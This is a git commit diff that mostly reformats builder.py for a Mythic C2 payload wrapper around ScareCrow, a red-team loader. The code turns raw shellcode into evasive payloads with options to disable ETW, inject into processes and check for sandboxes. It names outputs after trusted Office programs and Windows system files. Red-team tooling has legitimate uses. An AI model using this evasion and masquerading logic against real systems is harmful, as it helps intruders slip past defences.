3d926e855d179160290839d8c9205e210713f531
its-a-feature <codybthomas@gmail.com>
2023-04-21 09:55:44 -0500

    one small typo

--- Payload_Type/scarecrow_wrapper/mythic/builder.py
+++ Payload_Type/scarecrow_wrapper/mythic/builder.py
@@ -76,25 +76,27 @@ class ScarecrowWrapper(PayloadType):
                 return resp
             agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid).name
             # shutil to copy payload files over
-            copy_tree(self.agent_code_path, agent_build_path)
+            copy_tree(str(self.agent_code_path), agent_build_path)
             working_path = "{}/original.exe".format(agent_build_path)
-            output_path ="{}/OneNote.exe".format(agent_build_path)
+            output_path = "{}/OneNote.exe".format(agent_build_path)
 
             with open(str(working_path), "wb") as f:
                 f.write(base64.b64decode(self.wrapped_payload))
             with open(str(working_path), "rb") as f:
                 header = f.read(2)
-                if header == b"\x4d\x5a": # if PE file
+                if header == b"\x4d\x5a":  # if PE file
                     resp.build_stderr = "Supplied payload is a PE instead of raw shellcode."
                     return resp
 
-            command =  "cd {}/ScareCrow/; go build; chmod +x ScareCrow; ./ScareCrow ".format(agent_build_path, agent_build_path)
+            command = "cd {}/ScareCrow/; go build; chmod +x ScareCrow; ./ScareCrow ".format(agent_build_path,
+                                                                                            agent_build_path)
             command += "-I {} -Loader {}{}{}{}{}{}".format(
                 working_path,
                 self.get_parameter("loader"),
                 " -noetw" if not self.get_parameter("etw") else "",
                 " -console" if self.get_parameter("console") else "",
-                " -injection {}".format(self.get_parameter("injection")) if self.get_parameter("injection") != "" else "",
+                " -injection {}".format(self.get_parameter("injection")) if self.get_parameter(
+                    "injection") != "" else "",
                 " -domain {}".format(self.get_parameter("domain")) if self.get_parameter("domain") != "" else "",
                 " -sandbox" if self.get_parameter("sandbox") else "",
                 " -unmodified" if self.get_parameter("unmodified") else "",
@@ -111,15 +113,18 @@ class ScarecrowWrapper(PayloadType):
                 output += f"[stdout]\n{stdout.decode()}"
             if stderr:
                 output += f"[stderr]\n{stderr.decode()}"
-            
+
             if self.get_parameter("loader") == "control":
-                names = ["appwizard", "bthprop", "desktop", "netfirewall", "FlashPlayer", "hardwarewiz", "inetcontrol", "control", "irprop", "game", "inputs", "mimosys", "ncp", "power", "speech", "system", "Tablet", "telephone", "datetime", "winsec"]
+                names = ["appwizard", "bthprop", "desktop", "netfirewall", "FlashPlayer", "hardwarewiz", "inetcontrol",
+                         "control", "irprop", "game", "inputs", "mimosys", "ncp", "power", "speech", "system", "Tablet",
+                         "telephone", "datetime", "winsec"]
                 extension = ".cpl"
             elif self.get_parameter("loader") == "binary":
                 names = ["Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive", "OneNote"]
                 extension = ".exe"
             elif self.get_parameter("loader") == "dll":
-                names = ["apphelp", "bcryptprimitives", "cfgmgr32", "combase", "cryptsp", "dpapi", "sechost", "schannel", "urlmon", "win32u"]
+                names = ["apphelp", "bcryptprimitives", "cfgmgr32", "combase", "cryptsp", "dpapi", "sechost",
+                         "schannel", "urlmon", "win32u"]
                 extension = ".dll"
             else:
                 raise Exception(f"Unknown loader parameter: {self.get_parameter('loader')}")
@@ -130,7 +135,8 @@ class ScarecrowWrapper(PayloadType):
                 if os.path.exists(output_path):
                     resp.payload = open(output_path, "rb").read()
                     resp.status = BuildStatus.Success
-                    resp.build_message = "Command: " + command + "\n" + "New ScareCrow payload created! - {}".format(output_name)
+                    resp.build_message = "Command: " + command + "\n" + "New ScareCrow payload created! - {}".format(
+                        output_name)
                     return resp
             resp.payload = b""
             resp.build_stderr = "Failed, output: " + output + "\n Output path: " + output_path
